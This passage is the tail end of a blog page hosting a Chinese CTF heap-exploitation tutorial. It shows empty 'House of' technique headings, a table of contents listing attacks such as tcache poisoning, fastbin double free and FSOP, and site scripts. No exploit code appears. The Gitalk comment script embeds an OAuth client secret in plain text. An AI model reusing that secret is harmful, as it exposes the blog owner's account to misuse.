<h3 id="House-of-Einherjar-英灵の屋"><a href="#House-of-Einherjar-英灵の屋" class="headerlink" title="House of Einherjar - 英灵の屋"></a>House of Einherjar - 英灵の屋</h3><h3 id="House-of-Force-力の金阁"><a href="#House-of-Force-力の金阁" class="headerlink" title="House of Force - 力の金阁"></a>House of Force - 力の金阁</h3><h3 id="House-of-Lore-传说の屋"><a href="#House-of-Lore-传说の屋" class="headerlink" title="House of Lore - 传说の屋"></a>House of Lore - 传说の屋</h3><h3 id="House-of-Orange-橘子の室"><a href="#House-of-Orange-橘子の室" class="headerlink" title="House of Orange - 橘子の室"></a>House of Orange - 橘子の室</h3><h3 id="House-of-Rabbit-兔子の窝"><a href="#House-of-Rabbit-兔子の窝" class="headerlink" title="House of Rabbit - 兔子の窝"></a>House of Rabbit - 兔子の窝</h3><h3 id="House-of-Roman-罗马の家"><a href="#House-of-Roman-罗马の家" class="headerlink" title="House of Roman - 罗马の家"></a>House of Roman - 罗马の家</h3><h3 id="House-of-Spirit-精神の院"><a href="#House-of-Spirit-精神の院" class="headerlink" title="House of Spirit - 精神の院"></a>House of Spirit - 精神の院</h3>
    </div>

    
    
    
        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/arttnba3">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
              <a href="/tags/ROP/" rel="tag"># ROP</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/python/" rel="tag"># python</a>
              <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># 栈迁移</a>
              <a href="/tags/UAF/" rel="tag"># UAF</a>
              <a href="/tags/Integer-Overflow/" rel="tag"># Integer Overflow</a>
              <a href="/tags/Fastbin-Attack/" rel="tag"># Fastbin Attack</a>
              <a href="/tags/tcache-poisoning/" rel="tag"># tcache poisoning</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/11/20/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0X04%E3%80%91%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/" rel="prev" title="【算法浅析-0X04】快速排序算法浅析 by arttnba3">
      <i class="fa fa-chevron-left"></i> 【算法浅析-0X04】快速排序算法浅析 by arttnba3
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-PWN-简易Linux堆利用入门教程by-arttnba3"><span class="nav-number">1.</span> <span class="nav-text">CTF-PWN-简易Linux堆利用入门教程by arttnba3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-写在开始之前"><span class="nav-number">1.1.</span> <span class="nav-text">0x00.写在开始之前</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识："><span class="nav-number">1.1.1.</span> <span class="nav-text">前置知识：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-堆内存的分配-amp-释放"><span class="nav-number">1.2.</span> <span class="nav-text">0x01.堆内存的分配&amp;释放</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#系统调用：brk"><span class="nav-number">1.2.1.</span> <span class="nav-text">系统调用：brk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内存分配基本思想：重用"><span class="nav-number">1.2.2.</span> <span class="nav-text">内存分配基本思想：重用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-number">1.2.3.</span> <span class="nav-text">malloc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc-hook"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">__malloc_hook</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-number">1.2.4.</span> <span class="nav-text">free</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free-hook"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">__free_hook</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#realloc"><span class="nav-number">1.2.5.</span> <span class="nav-text">realloc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#realloc-hook"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">__realloc_hook</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-堆相关数据结构"><span class="nav-number">1.3.</span> <span class="nav-text">0x02.堆相关数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-chunk"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本结构"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">基本结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Top-Chunk"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Top Chunk</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-arena"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.arena</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-arena"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">main_arena</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#①fast-bin"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">①fast bin</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#安全检查"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text">安全检查</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#size"><span class="nav-number">1.3.2.2.1.1.</span> <span class="nav-text">size</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#double-free"><span class="nav-number">1.3.2.2.1.2.</span> <span class="nav-text">double free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#②tcache（only-libc2-26-and-up）"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">②tcache（only libc2.26 and up）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#安全检查-1"><span class="nav-number">1.3.2.3.1.</span> <span class="nav-text">安全检查</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#tcache-key（only-libc2-29-and-up）"><span class="nav-number">1.3.2.3.1.1.</span> <span class="nav-text">tcache key（only libc2.29 and up）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#③unsorted-bin"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">③unsorted bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#④small-bin"><span class="nav-number">1.3.2.5.</span> <span class="nav-text">④small bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#⑤large-bin"><span class="nav-number">1.3.2.6.</span> <span class="nav-text">⑤large bin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-基础的利用方式"><span class="nav-number">1.4.</span> <span class="nav-text">0x03.基础的利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、地址泄露"><span class="nav-number">1.4.1.</span> <span class="nav-text">一、地址泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bins-libc基址"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">bins - libc基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-key-堆基址（only-libc2-29-and-up）"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">tcache key - 堆基址（only libc2.29 and up）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、堆溢出"><span class="nav-number">1.4.2.</span> <span class="nav-text">二、堆溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span class="nav-number">1.4.2.0.1.</span> <span class="nav-text">例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#off-by-one"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">off by one</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="nav-number">1.4.2.1.1.</span> <span class="nav-text">例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#off-by-null"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">off by null</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：LCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><span class="nav-number">1.4.2.2.1.</span> <span class="nav-text">例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、use-after-free"><span class="nav-number">1.4.3.</span> <span class="nav-text">三、use after free</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：ciscn-2019-n-3-Use-After-Free"><span class="nav-number">1.4.3.0.1.</span> <span class="nav-text">例题：ciscn_2019_n_3 - Use After Free</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#double-free-1"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">double free</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin-double-free"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">fastbin double free</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#size检查"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">size检查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-hook-0x23"><span class="nav-number">1.4.3.2.2.</span> <span class="nav-text">__malloc_hook - 0x23</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例题："><span class="nav-number">1.4.3.2.3.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-double-free"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">tcache double free</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：babygame-double-free-tcache-poisoning"><span class="nav-number">1.4.3.3.1.</span> <span class="nav-text">例题：babygame - double free + tcache poisoning</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-key-bypass（libc-2-29-and-up）"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">tcache key bypass（libc 2.29 and up）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题1（清除tcache-key）："><span class="nav-number">1.4.3.4.1.</span> <span class="nav-text">例题1（清除tcache key）：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例题2（fastbin-double-free）："><span class="nav-number">1.4.3.4.2.</span> <span class="nav-text">例题2（fastbin double free）：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、ROP"><span class="nav-number">1.4.4.</span> <span class="nav-text">四、ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#environ"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">__environ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：miniLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><span class="nav-number">1.4.4.1.1.</span> <span class="nav-text">例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setcontext"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">setcontext</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：bytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><span class="nav-number">1.4.4.2.1.</span> <span class="nav-text">例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、堆重叠（overlapping）"><span class="nav-number">1.4.5.</span> <span class="nav-text">五、堆重叠（overlapping）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><span class="nav-number">1.4.5.0.1.</span> <span class="nav-text">例题：*CTF2021 - babyheap - Use After Free + tcache poisoning</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六、堆风水"><span class="nav-number">1.4.6.</span> <span class="nav-text">六、堆风水</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><span class="nav-number">1.4.6.0.1.</span> <span class="nav-text">例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#七、IO-FILE"><span class="nav-number">1.4.7.</span> <span class="nav-text">七、IO_FILE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable-hijack"><span class="nav-number">1.4.7.1.</span> <span class="nav-text">vtable hijack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：-V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><span class="nav-number">1.4.7.1.1.</span> <span class="nav-text">例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IO-FILE-plus结构体中-vtable-相对偏移"><span class="nav-number">1.4.7.2.</span> <span class="nav-text">_IO_FILE_plus结构体中 vtable 相对偏移</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable-合法性检测-start-from-glibc2-24"><span class="nav-number">1.4.7.3.</span> <span class="nav-text">vtable 合法性检测(start from glibc2.24)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable表劫持姿势-under-glibc2-28"><span class="nav-number">1.4.7.4.</span> <span class="nav-text">vtable表劫持姿势(under glibc2.28)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FSOP"><span class="nav-number">1.4.7.5.</span> <span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例题：ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><span class="nav-number">1.4.7.5.1.</span> <span class="nav-text">例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exit-函数与FSOP相关…"><span class="nav-number">1.4.7.6.</span> <span class="nav-text">exit()函数与FSOP相关…</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-更加高级的攻击手法"><span class="nav-number">1.5.</span> <span class="nav-text">0x04.更加高级的攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Einherjar-英灵の屋"><span class="nav-number">1.5.1.</span> <span class="nav-text">House of Einherjar - 英灵の屋</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Force-力の金阁"><span class="nav-number">1.5.2.</span> <span class="nav-text">House of Force - 力の金阁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Lore-传说の屋"><span class="nav-number">1.5.3.</span> <span class="nav-text">House of Lore - 传说の屋</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Orange-橘子の室"><span class="nav-number">1.5.4.</span> <span class="nav-text">House of Orange - 橘子の室</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Rabbit-兔子の窝"><span class="nav-number">1.5.5.</span> <span class="nav-text">House of Rabbit - 兔子の窝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Roman-罗马の家"><span class="nav-number">1.5.6.</span> <span class="nav-text">House of Roman - 罗马の家</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Spirit-精神の院"><span class="nav-number">1.5.7.</span> <span class="nav-text">House of Spirit - 精神の院</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="arttnba3"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">arttnba3</p>
  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">52</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/arttnba3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1543127579@qq.com" title="E-Mail → mailto:1543127579@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/7518681149" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;7518681149" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/arttnba3" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Friends' Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://luoq1an.github.io/" title="https:&#x2F;&#x2F;luoq1an.github.io" rel="noopener" target="_blank">luoqian</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://ll1ng.github.io/" title="https:&#x2F;&#x2F;ll1ng.github.io" rel="noopener" target="_blank">ling</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://shal10w.github.io/" title="https:&#x2F;&#x2F;shal10w.github.io" rel="noopener" target="_blank">shallow</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eqqie.cn/" title="https:&#x2F;&#x2F;eqqie.cn" rel="noopener" target="_blank">eqqie</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cor1e.cn/" title="https:&#x2F;&#x2F;cor1e.cn" rel="noopener" target="_blank">cor1e</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://yunq1ao.com/" title="https:&#x2F;&#x2F;yunq1ao.com" rel="noopener" target="_blank">yunqiao</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io" rel="noopener" target="_blank">mercer</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">arttnba3</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'a040036b8e5ab6a9838d',
      clientSecret: '7b9006697fe7a78e56f22a025caf2deb03e14ea8',
      repo        : 'BlogComment',
      owner       : 'SakuraiHimeki',
      admin       : ['SakuraiHimeki'],
      id          : 'b6891898d52531370db51192b9ec636d',
        language: '',
      distractionFreeMode: false
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
